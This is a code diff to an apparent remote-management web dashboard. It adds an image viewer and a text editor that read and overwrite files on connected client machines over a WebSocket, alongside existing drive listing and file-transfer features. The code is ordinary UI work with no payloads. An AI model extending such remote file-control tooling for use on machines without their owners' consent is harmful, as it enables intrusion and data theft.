@@ -248,6 +248,136 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
   border-top: 1px solid var(--border);
   background: var(--surf2);
 }
+
+/* ══ IMAGE VIEWER & TEXT EDITOR MODAL ═══════════════ */
+.modal-overlay {
+  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(4px);
+  display: none; align-items: center; justify-content: center;
+  z-index: 10000; animation: fadeIn .2s;
+}
+.modal-overlay.show { display: flex; }
+
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+.modal-content {
+  background: var(--surf); border: 1px solid var(--border);
+  border-radius: 12px; max-width: 90vw; max-height: 90vh;
+  display: flex; flex-direction: column; overflow: hidden;
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
+  animation: slideUp .3s cubic-bezier(.4,0,.2,1);
+}
+
+@keyframes slideUp {
+  from { transform: translateY(20px); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+
+.modal-header {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 12px 16px; border-bottom: 1px solid var(--border);
+  background: var(--surf2); flex-shrink: 0;
+}
+
+.modal-title {
+  font-family: var(--sans); font-weight: 800; font-size: 13px;
+  color: var(--accent); letter-spacing: .08em; text-transform: uppercase;
+  display: flex; align-items: center; gap: 8px;
+}
+
+.modal-path {
+  font-family: var(--mono); font-size: 11px; color: var(--muted);
+  margin-left: 12px; max-width: 500px; overflow: hidden;
+  text-overflow: ellipsis; white-space: nowrap;
+}
+
+.modal-close {
+  background: none; border: none; color: var(--muted);
+  cursor: pointer; font-size: 20px; padding: 4px 8px;
+  transition: color .12s; line-height: 1;
+}
+.modal-close:hover { color: var(--red); }
+
+.modal-body {
+  flex: 1; overflow: auto; padding: 0; position: relative;
+  min-height: 400px;
+}
+
+/* Image Viewer */
+.image-viewer-container {
+  display: flex; align-items: center; justify-content: center;
+  min-height: 400px; padding: 20px; background: #04070d;
+}
+
+.image-viewer-img {
+  max-width: 100%; max-height: 70vh; object-fit: contain;
+  border-radius: 6px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+}
+
+.image-info {
+  position: absolute; bottom: 10px; left: 10px;
+  background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(8px);
+  border: 1px solid var(--border); border-radius: 6px;
+  padding: 6px 12px; font-size: 10px; color: var(--muted);
+  font-family: var(--mono);
+}
+
+/* Text Editor */
+.text-editor-container {
+  display: flex; flex-direction: column; height: 70vh;
+}
+
+.text-editor-toolbar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 8px 16px; border-bottom: 1px solid var(--border);
+  background: var(--surf2); flex-shrink: 0;
+}
+
+.text-editor-info {
+  font-size: 10px; color: var(--muted); font-family: var(--mono);
+  display: flex; gap: 12px;
+}
+
+.text-editor-actions {
+  display: flex; gap: 6px;
+}
+
+.editor-btn {
+  font-family: var(--mono); font-size: 10px; font-weight: 600;
+  padding: 5px 12px; border: 1px solid var(--border);
+  border-radius: 5px; cursor: pointer; background: transparent;
+  color: var(--text); transition: all .12s;
+}
+.editor-btn:hover { border-color: var(--accent); color: var(--accent); }
+.editor-btn.save { background: var(--green); border-color: var(--green); color: #000; }
+.editor-btn.save:hover { opacity: .85; }
+.editor-btn:disabled { opacity: .3; pointer-events: none; }
+
+.text-editor-area {
+  flex: 1; padding: 16px; overflow: auto;
+}
+
+.text-editor-textarea {
+  width: 100%; height: 100%; min-height: 500px;
+  background: #04070d; border: 1px solid var(--border);
+  border-radius: 6px; padding: 12px; color: var(--text);
+  font-family: var(--mono); font-size: 13px; line-height: 1.6;
+  resize: none; outline: none;
+  transition: border-color .2s;
+}
+.text-editor-textarea:focus {
+  border-color: var(--accent);
+  box-shadow: 0 0 0 2px rgba(0, 229, 255, 0.1);
+}
+
+.editor-status {
+  padding: 8px 16px; border-top: 1px solid var(--border);
+  background: var(--surf2); font-size: 10px; color: var(--muted);
+  text-align: center; font-family: var(--mono);
+}
 .ex-transfer-hdr {
   font-size: 9px; text-transform: uppercase; letter-spacing: .12em;
   color: var(--muted); padding: 8px 12px 4px;
@@ -405,6 +535,57 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
 
 </div><!-- /main -->
 
+<!-- ══ IMAGE VIEWER MODAL ══════════════════════════════ -->
+<div class="modal-overlay" id="imageViewerModal">
+  <div class="modal-content" style="width: 90vw;">
+    <div class="modal-header">
+      <div>
+        <span class="modal-title">🖼 IMAGE VIEWER</span>
+        <span class="modal-path" id="imageViewerPath"></span>
+      </div>
+      <button class="modal-close" onclick="closeImageViewer()">×</button>
+    </div>
+    <div class="modal-body">
+      <div class="image-viewer-container">
+        <img id="imageViewerImg" class="image-viewer-img" alt="Preview">
+      </div>
+      <div class="image-info" id="imageViewerInfo"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ TEXT EDITOR MODAL ═══════════════════════════════ -->
+<div class="modal-overlay" id="textEditorModal">
+  <div class="modal-content" style="width: 90vw;">
+    <div class="modal-header">
+      <div>
+        <span class="modal-title">📝 TEXT EDITOR</span>
+        <span class="modal-path" id="textEditorPath"></span>
+      </div>
+      <button class="modal-close" onclick="closeTextEditor()">×</button>
+    </div>
+    <div class="modal-body">
+      <div class="text-editor-container">
+        <div class="text-editor-toolbar">
+          <div class="text-editor-info">
+            <span id="editorFileSize"></span>
+            <span id="editorLines"></span>
+            <span id="editorModified" style="color: var(--yellow); display: none;">● Modified</span>
+          </div>
+          <div class="text-editor-actions">
+            <button class="editor-btn" onclick="reloadTextFile()">🔄 Reload</button>
+            <button class="editor-btn save" onclick="saveTextFile()" id="saveBtn">💾 Save</button>
+          </div>
+        </div>
+        <div class="text-editor-area">
+          <textarea id="textEditorTextarea" class="text-editor-textarea" spellcheck="false"></textarea>
+        </div>
+        <div class="editor-status" id="editorStatus">Ready</div>
+      </div>
+    </div>
+  </div>
+</div>
+
 <script>
 // ════════════════════════════════════════════════════════════
 //  STATE
@@ -465,6 +646,8 @@ ws.onmessage = ({data}) => {
   // ── Explorer ─────────────────────────────────────────────
   if (type==='directory_list') { renderDir(msg.data); return; }
   if (type==='drives_list')    { renderDrives(msg.data); return; }
+  if (type==='file_content')   { handleFileContent(msg); return; }
+  if (type==='write_file_result') { handleWriteFileResult(msg); return; }
 
   // ── File transfers ────────────────────────────────────────
   if (type==='folder_transfer_start') { onFolderStart(msg); return; }
@@ -619,8 +802,37 @@ function renderDir(data) {
 
 function rowDbl(el) {
   const {type, path} = el.dataset;
-  if(type==='dir'||type==='parent') navTo(path);
-  else { exSelected.clear(); exSelected.add(path); updateSel(); downloadSelected(); }
+  if(type==='dir'||type==='parent') {
+    navTo(path);
+  } else {
+    // Check file extension to decide action
+    const ext = path.substring(path.lastIndexOf('.')).toLowerCase();
+    
+    // Text files - open in editor
+    const textExts = ['.txt', '.py', '.js', '.html', '.css', '.json', '.xml', '.md', 
+                      '.log', '.csv', '.ini', '.yaml', '.yml', '.sh', '.bat', '.c', 
+                      '.cpp', '.java', '.php', '.rb', '.go', '.rs', '.ts', '.jsx', 
+                      '.tsx', '.vue', '.sql', '.conf', '.cfg'];
+    
+    // Image files - open in viewer
+    const imageExts = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.svg', '.ico'];
+    
+    if (textExts.includes(ext) || imageExts.includes(ext)) {
+      // Request file content from client
+      ws.send(JSON.stringify({
+        type: 'read_file',
+        client_id: selClient,
+        path: path
+      }));
+      log(`📂 Opening: ${path.split(/[\\/]/).pop()}`, 'info');
+    } else {
+      // Other files - download
+      exSelected.clear(); 
+      exSelected.add(path); 
+      updateSel(); 
+      downloadSelected();
+    }
+  }
 }
 
 function rowClick(el, e) {
@@ -868,6 +1080,174 @@ function log(msg, cls='') {
   $out.append(ts,el); $out.scrollTop=$out.scrollHeight;
   while($out.children.length>300) $out.removeChild($out.firstChild);
 }
+
+// ════════════════════════════════════════════════════════════
+//  IMAGE VIEWER & TEXT EDITOR
+// ════════════════════════════════════════════════════════════
+
+let currentFilePath = null;
+let currentFileContent = null;
+let isTextModified = false;
+
+// Handle file content received from client
+function handleFileContent(msg) {
+  const data = msg.data;
+  const path = msg.path;
+  
+  if (!data) {
+    log('Failed to read file', 'error');
+    return;
+  }
+  
+  if (data.error) {
+    log(`File error: ${data.error}`, 'error');
+    return;
+  }
+  
+  currentFilePath = path;
+  
+  // Image file
+  if (data.type === 'image') {
+    const ext = data.extension || '';
+    const mimeMap = {
+      '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
+      '.png': 'image/png', '.gif': 'image/gif',
+      '.bmp': 'image/bmp', '.webp': 'image/webp',
+      '.svg': 'image/svg+xml', '.ico': 'image/x-icon'
+    };
+    const mime = mimeMap[ext] || 'image/jpeg';
+    openImageViewer(path, data.content, mime);
+  }
+  // Text file
+  else if (data.type === 'text') {
+    openTextEditor(path, data.content, data.size);
+  }
+}
+
+// Image Viewer functions
+function openImageViewer(path, base64Data, mimeType) {
+  document.getElementById('imageViewerPath').textContent = path;
+  const img = document.getElementById('imageViewerImg');
+  img.src = `data:${mimeType};base64,${base64Data}`;
+  
+  img.onload = () => {
+    const info = document.getElementById('imageViewerInfo');
+    info.textContent = `${img.naturalWidth} × ${img.naturalHeight} px`;
+  };
+  
+  document.getElementById('imageViewerModal').classList.add('show');
+  log(`📷 Opened image: ${path.split(/[\\/]/).pop()}`, 'info');
+}
+
+function closeImageViewer() {
+  document.getElementById('imageViewerModal').classList.remove('show');
+  document.getElementById('imageViewerImg').src = '';
+}
+
+// Text Editor functions
+function openTextEditor(path, content, size) {
+  currentFileContent = content;
+  isTextModified = false;
+  
+  document.getElementById('textEditorPath').textContent = path;
+  document.getElementById('textEditorTextarea').value = content;
+  document.getElementById('editorFileSize').textContent = `Size: ${fmtSize(size)}`;
+  
+  const lines = content.split('\n').length;
+  document.getElementById('editorLines').textContent = `Lines: ${lines}`;
+  document.getElementById('editorModified').style.display = 'none';
+  document.getElementById('editorStatus').textContent = 'Ready';
+  
+  document.getElementById('textEditorModal').classList.add('show');
+  log(`📝 Opened file: ${path.split(/[\\/]/).pop()}`, 'info');
+  
+  // Track changes
+  const textarea = document.getElementById('textEditorTextarea');
+  textarea.oninput = () => {
+    isTextModified = (textarea.value !== currentFileContent);
+    document.getElementById('editorModified').style.display = isTextModified ? 'inline' : 'none';
+    const newLines = textarea.value.split('\n').length;
+    document.getElementById('editorLines').textContent = `Lines: ${newLines}`;
+  };
+}
+
+function closeTextEditor() {
+  if (isTextModified) {
+    if (!confirm('You have unsaved changes. Close anyway?')) {
+      return;
+    }
+  }
+  document.getElementById('textEditorModal').classList.remove('show');
+  document.getElementById('textEditorTextarea').value = '';
+  currentFilePath = null;
+  currentFileContent = null;
+  isTextModified = false;
+}
+
+function reloadTextFile() {
+  if (!currentFilePath || !selClient) return;
+  
+  if (isTextModified && !confirm('Discard your changes?')) {
+    return;
+  }
+  
+  ws.send(JSON.stringify({
+    type: 'read_file',
+    client_id: selClient,
+    path: currentFilePath
+  }));
+  document.getElementById('editorStatus').textContent = 'Reloading...';
+}
+
+function saveTextFile() {
+  if (!currentFilePath || !selClient) return;
+  
+  const content = document.getElementById('textEditorTextarea').value;
+  document.getElementById('saveBtn').disabled = true;
+  document.getElementById('editorStatus').textContent = 'Saving...';
+  
+  ws.send(JSON.stringify({
+    type: 'write_file',
+    client_id: selClient,
+    path: currentFilePath,
+    content: content
+  }));
+}
+
+function handleWriteFileResult(msg) {
+  document.getElementById('saveBtn').disabled = false;
+  
+  if (msg.success) {
+    document.getElementById('editorStatus').textContent = '✓ Saved successfully';
+    document.getElementById('editorStatus').style.color = 'var(--green)';
+    currentFileContent = document.getElementById('textEditorTextarea').value;
+    isTextModified = false;
+    document.getElementById('editorModified').style.display = 'none';
+    log(`💾 Saved: ${currentFilePath.split(/[\\/]/).pop()}`, 'info');
+    
+    setTimeout(() => {
+      document.getElementById('editorStatus').textContent = 'Ready';
+      document.getElementById('editorStatus').style.color = 'var(--muted)';
+    }, 2000);
+  } else {
+    document.getElementById('editorStatus').textContent = `✕ Error: ${msg.error}`;
+    document.getElementById('editorStatus').style.color = 'var(--red)';
+    log(`Save failed: ${msg.error}`, 'error');
+  }
+}
+
+// Close modals with ESC key
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape') {
+    if (document.getElementById('imageViewerModal').classList.contains('show')) {
+      closeImageViewer();
+    }
+    if (document.getElementById('textEditorModal').classList.contains('show')) {
+      closeTextEditor();
+    }
+  }
+});
+
 </script>
 </body>
 </html>
